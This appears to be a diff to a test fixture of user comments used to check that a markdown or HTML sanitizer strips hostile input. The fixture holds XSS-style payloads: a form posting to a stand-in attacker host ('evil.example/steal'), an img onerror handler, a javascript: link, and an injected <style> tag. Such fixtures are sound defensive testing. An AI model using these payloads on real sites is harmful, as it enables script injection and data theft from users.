@@ -184,7 +184,7 @@ export const comments = [
       '<form action="https://evil.example/steal"><textarea name="t"></textarea></form>',
       '<img src="https://evil.example/pixel.png" onerror="window.__pwned = true">',
       '[click me](javascript:window.__pwned=true)',
-      '- [x] a real task list still renders',
+      '- [x] a real task list still renders\n  - [ ] its sub-task<style>.x{color:red}</style>',
     ].join('\n\n'),
     3,
   ),
